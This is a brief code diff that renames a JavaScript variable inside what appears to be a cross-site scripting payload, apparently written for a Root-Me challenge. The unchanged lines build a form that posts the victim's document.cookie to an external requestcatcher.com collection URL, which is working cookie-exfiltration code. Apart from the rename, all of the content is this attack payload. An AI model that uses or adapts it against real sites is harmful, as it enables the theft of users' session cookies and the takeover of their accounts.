@@ -1,6 +1,6 @@
-const res = document.getElementById('result');
+const r = document.getElementById('result');
 
-res.innerHTML = `
+r.innerHTML = `
 <form id="form" action="https://zpiboo.requestcatcher.com/rootme" method="POST">
   <input name="cookies" value="${document.cookie.replace('"','\\"')}">
   <input type="submit">
